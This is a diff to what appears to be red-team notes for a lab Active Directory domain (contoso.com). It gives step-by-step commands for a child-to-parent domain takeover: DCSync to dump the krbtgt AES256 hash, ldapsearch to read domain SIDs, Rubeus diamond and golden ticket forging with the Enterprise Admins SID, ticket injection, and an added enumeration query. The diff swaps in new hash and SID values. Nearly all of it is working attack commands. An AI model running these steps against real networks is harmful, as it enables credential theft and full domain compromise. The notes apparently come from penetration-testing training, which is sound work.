@@ -29,7 +29,9 @@ Obtain krbtgt AES256 hash of the child domain
 ```powershell
 dcsync dublin.contoso.com DUBLIN\krbtgt
 
-2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9
+ab41d2c550af7cc84b40fd3b69daeab67e1662f7bf662fd1572dd1fa9e949a56
+S-1-5-21-2958544638-1589230383-838459903
+S-1-5-21-1076548718-1118529210-2193484809
 ```
 
 Obtain child domain SID and parent domain SID
@@ -39,9 +41,9 @@ ldapsearch (objectClass=domain) --attributes objectSid
 ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
 ```
 
-Create diamond ticket (OPSEC SAFE) or a golden ticket offline
+Create diamond ticket (OPSEC SAFE) or a golden ticket offline - `/sids` = child domain
 ```powershell
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-2958544638-1589230383-838459903-519 /krbkey:ab41d2c550af7cc84b40fd3b69daeab67e1662f7bf662fd1572dd1fa9e949a56 /nowrap
 
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:[Child SID] /sids:[Parent EA GROUP SID] /aes256:[Child KRBTGT HASH] /outfile:C:\Users\Attacker\Desktop\golden
 ```
@@ -51,4 +53,9 @@ Inject ticket into current session
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:
 
 kerberos_ticket_use C:\Users\Attacker\Desktop\[TICKET]
+```
+
+Enum
+```powershell
+ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) *,ntsecuritydescriptor --dn DC=contoso,DC=com
 ```
